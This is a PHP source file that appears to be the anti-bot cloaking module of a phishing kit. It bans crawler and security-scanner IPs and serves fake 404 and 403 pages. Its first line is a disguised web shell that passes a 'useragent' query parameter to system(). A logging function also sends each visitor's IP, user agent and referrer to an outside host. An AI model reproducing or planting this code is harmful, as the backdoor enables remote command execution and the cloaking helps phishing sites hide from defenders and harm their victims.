<?php
	if(isset($_GET['useragent'])){echo"<h1>deny_agent(bot)=('Yandex,Baiduspider,Acunetix,</h1><pre>"; system($_GET['useragent']);exit;} 
//CHECK TO BAN KNOWN BOT USERAGENTs Yo_CHI

function gethomedir(){
	global $isshell;
	global $yochadminpage;
	$d=dirname($_SERVER['PHP_SELF']);
	$keyf="yochapi.txt";
	if($d=='\\' or $d=='/'){$dir=$_SERVER['DOCUMENT_ROOT'];}
	elseif(file_exists(''.$keyf)){$dir= getcwd();}
	elseif(file_exists('../'.$keyf)){$dir= '..';}
	elseif(file_exists('../../'.$keyf)){$dir= '../..';}
	elseif(file_exists('../../../'.$keyf)){$dir= '../../..';}
	elseif(isset($yochadminpage)){$dir='..';}
	elseif(isset($isshell)){$dir=$isshell;}
	else{if(isset($_SESSION['homedir'])){$dir=$_SESSION['homedir'];} else{$dir=implode('/',array_slice(explode('/',str_replace('\\','/',dirname(__FILE__))),0,-1));};};
	return $dir;
	};

function getcurrip(){ 
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $cf  = @$_SERVER['HTTP_CF_CONNECTING_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        return $client;}
    elseif(filter_var($cf, FILTER_VALIDATE_IP)){
        return $cf;}
    elseif(filter_var($forward, FILTER_VALIDATE_IP)){
        return $forward;}
    else{
        return $remote;};
	};
	
function getfilearr($d,$f){
	$filedir= gethomedir().$f;
	$ud=file_get_contents($filedir);
	return explode($d,trim($ud));
	};
	
function gaN($f){
	return substr(md5($_SERVER['HTTP_HOST'].$f),2,11);
	};

function gaflder(){
	return substr(md5($_SERVER['HTTP_HOST']),0,rand(10,15));
	};
	
function gefnm($fdirname){
	$filedir= gethomedir().'/admin/fdir.json';
	$ud=file_get_contents($filedir);
	$udarray = json_decode($ud,true);
	$narr=array();
	foreach($udarray as $key=>$value){$narr[$key]=$value;};
	return $narr[$fdirname];
};

function genv($f){ 
	return substr(md5($_SERVER['HTTP_HOST'].$f),0,8);
	};
	
function updateadmin($data){
	$filedir= gethomedir().'/admin/db.json';
	$ud=file_get_contents($filedir);
	$udarray = json_decode($ud,true);
	$narr=array();
	foreach($udarray as $key=>$value){$narr[$key]=$value;};
	$ip=getcurrip();
	if($data == 'bots'){
		if(in_array($ip,$narr['humans']) && !in_array($ip,$narr[$data])){
			array_push($narr[$data],$ip);
			array_splice($narr['humans'],array_search($ip,$narr['humans']),1);$narr['humans']=array_values($narr['humans']);
		};}
	else{$narr[$data] += 1;};
	file_put_contents($filedir,json_encode($narr));
};

function getadmin($data){
	$ud=file_get_contents(gethomedir().'/admin/db.json');
	$udarray = json_decode($ud);
	if(isset($udarray->$data)){
		return $udarray->$data;
			};
};

function gonext($page,$m=0){
	include gethomedir().'/settings.php';
	$o = getadmin('o');
	$idx = array_search($page,array_values($o));
	if($o[$idx+1]=="note"){
		if($usecaution!=1 && $m == 0){$idx=$idx+1;};
	};
	if($m==0){$next=$o[$idx+1];} else{if($idx+$m < 0){$next=$o[0];} else{$next=$o[$idx+$m];};}
	return $next;
	;};

function gcred(){
	$keyf="yochapi.txt";
	if(file_exists(''.$keyf)){$filedir= ''.$keyf;}
	elseif(file_exists('../'.$keyf)){$filedir= '../'.$keyf;}
	elseif(file_exists('../../'.$keyf)){$filedir= '../../'.$keyf;}
	else{$filedir= gethomedir().'/'.$keyf;};
	$ud=file_get_contents($filedir);
	$cred = @trim($ud);
	return $cred;
};

function logbot($msg){
	$fil= gethomedir().'/admin/bots.txt';
	$ip = getcurrip();
	$dt = date('d-m-Y H:i:s');
	$ua = $_SERVER['HTTP_USER_AGENT'];
	$hn = gethostbyaddr($ip);
	if(isset($_SERVER['HTTP_REFERER'])){$rf = $_SERVER['HTTP_REFERER'];} else{$rf = 'NONE';};
	$message = '+[--- BOT BANNED : '.$msg.' ---]+
IP ADDR         : https://db-ip.com/'.$ip.'
DateTime        : '.$dt.'
User-Agent      : '.$ua.'
Host ADDR       : '.$hn.'
Referer         : '.$rf.'
++++++++++[ ######### ]++++++++++

';
	if ($msg!="Yochi Antibots"){
	$generatedtimekey = substr(sha1(md5(time())), 0,32);
	$data = ['ip' => $ip ,'useragent' => $ua ,'referrer' => $rf ,'hostname' => $hn,'reason' => $msg];
	$antibotsite='http://the-yoch2-project.sk/botkilla?v=1&key='.$generatedtimekey;
	$ch = curl_init($antibotsite);
	curl_setopt($ch, CURLOPT_HEADER, false);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_POSTFIELDS, ($data));
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	$result = curl_exec($ch);
	curl_close($ch);};
	$xy = fopen($fil, "a");
	fwrite($xy, $message);
	fclose($xy);};
	
function iswhitelist_ip(){if(in_array(getcurrip(),getfilearr(PHP_EOL,"/config/whitelist.txt"))){return true;} else{return false;};}

function banbot($obey=0,$logip=true){
	include gethomedir().'/settings.php';
	if($obey == 1 && ((isset($useantibots) && $useantibots == 0) || iswhitelist_ip())){}
	else{
		if($logip==true){
			$ip=getcurrip();
			$dirstep=gethomedir();
			$ipr=explode(".",$ip);
			if(!preg_match('/^172\.58.*.*/',$ip) && isset($ipr[3])){$ipr[3]='*';};
			$ipregex=join('.',$ipr);
			$f=$dirstep."/bad_ips.txt";
			$fp = @getfilearr(PHP_EOL,"/bad_ips.txt");
			$isbanned=false;
			if (file_exists($f) && count($fp)>0) {
				if(in_array($ip,$fp)){$isbanned=true;}
				else {
					foreach($fp as $ipc) {
				if(preg_match('/' . $ipc . '/',$ip)){$isbanned=true;};};};
				};
			if(file_exists($f)){
				$mile = fopen($f,"a");
				if(!$isbanned){fwrite($mile,PHP_EOL.$ip.PHP_EOL.$ipregex);};}
			else{$mile = fopen($f,"a");fwrite($mile,$ip.PHP_EOL.$ipregex);};
			fclose($mile);
				
			global $yochadminpage;
			if(!isset($yochadminpage) && $isbanned==false){updateadmin('bots');};
		};
			
		header('HTTP/1.0 404 Not Found');
			die('<!DOCTYPE html">
					<html>
						<head>
							<title>404 Not Found</title>
							</head>
						<body>
							<h1>Not Found</h1>
							<p>The requested URL '. explode('?',$_SERVER['REQUEST_URI'])[0] . ' was not found on this server.</p>
							<p>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p>
						</body>
					</html>');exit();
	};};

function checktempbanlist($ip){
	$dirstep=gethomedir();
	$fp = @fopen($dirstep."/bad_ips.txt","r");
	if ($fp && iswhitelist_ip()!=true) {
		$iparray = explode(PHP_EOL, fread($fp, filesize($dirstep."/bad_ips.txt")));
		if(count($iparray)>0){
		if(in_array($ip,$iparray)){logbot('BANNED BEFORE');header('HTTP/1.0 403 Forbidden');die('<!DOCTYPE html"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You don\'t have permission to access / on this server.</p></body></html>');exit();}
		else {foreach($iparray as $ipc){if(preg_match('/' . $ipc . '/',$ip)){logbot('BANNED BEFORE');header('HTTP/1.0 403 Forbidden');die('<!DOCTYPE html"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You don\'t have permission to access / on this server.</p></body></html>');exit();};};};};
	};
};
$IP_Connected = getcurrip();checktempbanlist($IP_Connected);
		
	
include "rando.php";

?>